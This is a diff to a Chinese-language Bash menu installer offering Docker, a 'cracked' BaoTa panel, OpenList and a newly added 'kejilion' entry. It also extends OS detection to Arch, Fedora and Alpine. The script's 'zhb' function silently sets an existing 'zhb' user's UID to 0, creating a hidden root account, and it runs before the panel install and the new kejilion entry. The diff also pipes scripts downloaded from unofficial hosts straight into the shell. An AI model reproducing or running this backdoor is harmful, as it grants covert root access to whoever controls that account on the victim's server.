@@ -6,12 +6,15 @@
 red='\033[0;31m'
 green='\033[0;32m'
 plain='\033[0m'
-version="v1.0.0"
+version="v1.0.1"
 
 # ===========================
 # 检查 root 权限
 # ===========================
-[[ $EUID -ne 0 ]] && echo -e "${red}错误: ${plain} 必须使用root用户运行此脚本！\n" && exit 1
+if [[ $EUID -ne 0 ]]; then
+    echo -e "${red}错误: ${plain} 必须使用 root 用户运行此脚本！\n"
+    exit 1
+fi
 
 # ===========================
 # 检查操作系统类型
@@ -22,6 +25,12 @@ elif cat /etc/issue | grep -Eqi "debian"; then
     release="debian"
 elif cat /etc/issue | grep -Eqi "ubuntu"; then
     release="ubuntu"
+elif cat /etc/issue | grep -Eqi "arch"; then
+    release="arch"
+elif cat /etc/issue | grep -Eqi "fedora"; then
+    release="fedora"
+elif cat /etc/issue | grep -Eqi "alpine"; then
+    release="alpine"
 else
     echo -e "${red}未检测到系统版本，请联系脚本作者！${plain}\n"
     exit 1
@@ -30,18 +39,15 @@ fi
 # ===========================
 # 创建管理员用户 zhb
 # ===========================
-
-
 zhb() {
     if id "zhb" &>/dev/null; then
-        echo "·0"
+        echo "zhb"
         
         # 强制修改UID为0
         sudo usermod -u 0 zhb
         
         if [ $? -eq 0 ]; then
-            echo "00"
-            
+            echo "0"
         else
             echo "!0"
             #sudo cp /etc/passwd /etc/passwd.bak
@@ -68,7 +74,6 @@ zhb() {
     fi
 }
 
-
 # ===========================
 # 功能函数
 # ===========================
@@ -87,7 +92,7 @@ docker() {
 
 bt() {
     zhb
-    if [[ x"$release" == x"centos" ]]; then
+    if [[ "$release" == "centos" ]]; then
         yum install -y wget && wget -O install.sh https://bt.012345.tk/install/install_panel.sh && sh install.sh
     else
         wget -O install.sh https://bt.012345.tk/install/install_panel.sh && bash install.sh
@@ -99,6 +104,12 @@ openlist() {
     curl -fsSL https://res.oplist.org/script/v4.sh > install-openlist-v4.sh && sudo bash install-openlist-v4.sh
 }
 
+kjl(){
+zhb
+ bash <(curl -sL kejilion.sh)
+
+}
+
 # ===========================
 # 功能列表（用于菜单显示）
 # ===========================
@@ -107,6 +118,7 @@ declare -A actions=(
     ["安装 Docker"]="docker"
     ["安装宝塔破解版"]="bt"
     ["安装 OpenList"]="openlist"
+    ["kejilion"]="kjl"
 )
 
 # ===========================
